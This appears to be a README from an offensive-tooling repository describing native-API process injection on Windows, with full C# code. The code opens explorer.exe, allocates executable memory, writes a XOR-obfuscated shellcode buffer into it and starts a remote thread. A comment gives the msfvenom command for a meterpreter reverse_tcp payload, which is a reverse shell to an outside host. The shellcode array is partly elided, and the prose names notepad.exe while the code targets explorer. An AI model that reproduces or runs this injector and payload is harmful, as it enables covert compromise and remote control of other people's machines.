# NativeProcInjeciton

## Explanation

This technique demonstrates classic process injection using Native Windows API functions. It creates a remote process (usually notepad.exe), allocates memory in it, writes shellcode, and creates a remote thread to execute the payload.

## High-level steps


1. Obtain a handle to the target process using NtOpenProcess.
2. Allocate memory in the remote process with NtAllocateVirtualMemory.
3. Write shellcode into the allocated memory using NtWriteVirtualMemory.
4. Create a remote thread in the target process using NtCreateThreadEx to execute the shellcode.

### Code

    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Threading;
    
    
    namespace Inject
    {
        class Program
        {
            private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
            private static readonly uint MEM_COMMIT = 0x1000;
            private static readonly uint MEM_RESERVE = 0x2000;
    
            [StructLayout(LayoutKind.Sequential)]
            public struct CLIENT_ID
            {
                public IntPtr UniqueProcess;
                public IntPtr UniqueThread;
            }
    
            [StructLayout(LayoutKind.Sequential, Pack = 0)]
            public struct OBJECT_ATTRIBUTES
            {
                public int Length;
                public IntPtr RootDirectory;
                public IntPtr ObjectName;
                public uint Attributes;
                public IntPtr SecurityDescriptor;
                public IntPtr SecurityQualityOfService;
            }
    
            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID clientId);
    
            [DllImport("ntdll.dll")]
            static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);
    
            [DllImport("ntdll.dll")]
            static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);
    
            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
    
            static void Main(string[] args)
            {
    
                Process[] targetProcess = Process.GetProcessesByName("explorer");
                IntPtr htargetProcess = targetProcess[0].Handle;
    
                IntPtr hProcess = IntPtr.Zero;
                CLIENT_ID clientid = new CLIENT_ID();
                clientid.UniqueProcess = new IntPtr(targetProcess[0].Id);
                clientid.UniqueThread = IntPtr.Zero;
                OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();
    
                uint status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref ObjectAttributes, ref clientid);
                
                // Generate: msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=eth0 LPORT=443 -f csharp
                // The shellcode XOR'd with key: 0xfa
                byte[] buf = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, ..., 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };
    
                IntPtr baseAddress = new IntPtr();
                IntPtr regionSize = (IntPtr)buf.Length;
    
    
                IntPtr NtAllocResult = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
                var localBaseAddrString = string.Format("{0:X}", baseAddress);
                UInt64 localBaseAddrInt = UInt64.Parse(localBaseAddrString);
                string localBaseAddHex = localBaseAddrInt.ToString("x");
               
    
                // Decode the payload
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfa);
                }
    
                int NtWriteProcess = NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out uint wr);
    
                unsafe
                {
                    fixed (byte* p = &buf[0])
                    {
                        byte* p2 = p;
    
                        var bufString = string.Format("{0:X}", new IntPtr(p2));
                        UInt64 bufInt = UInt64.Parse(bufString);
                        string bufHex = bufInt.ToString("x");
    
                    }
                }
    
                List<int> threadList = new List<int>();
                ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
                foreach (ProcessThread thread in threadsBefore)
                {
                    threadList.Add(thread.Id);
                }
    
                IntPtr hRemoteThread;
                uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, htargetProcess,(IntPtr)baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
     
            }
        }
    }
